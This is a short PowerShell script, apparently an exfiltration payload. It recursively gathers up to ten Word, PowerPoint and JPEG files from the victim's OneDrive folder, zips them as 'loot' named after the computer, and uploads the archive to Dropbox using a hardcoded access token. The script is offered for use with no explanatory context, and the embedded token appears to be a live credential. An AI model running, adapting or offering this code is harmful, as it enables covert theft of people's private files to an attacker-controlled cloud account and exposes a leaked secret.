function Upload-DropBox() {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]$SourceFilePath
    ) 
    $dropBoxAccessToken = "sl.Bnc5xEYyG4GfTXhIusT_lVzAeH0XaQk2_DG-JqQ0-mNYcFH1hhnYKFNLkVQDkLLTIN0RAZlHOqYry4wmJG_eta96w8vLSxmPHAX3uqDrRnv5IxTHin9-BguUbubY3SDLX2-U6VZlI3JSGKA"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $dropBoxAccessToken
    $authHeaders = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $authHeaders.Add("Authorization", $authorization)
    $authHeaders.Add("Dropbox-API-Arg", $arg)
    $authHeaders.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
}

$computerName = $env:COMPUTERNAME

if (Test-Path $env:OneDrive) {
    $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot-$computerName.zip" -Update
}

if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
    Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
    #Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
}
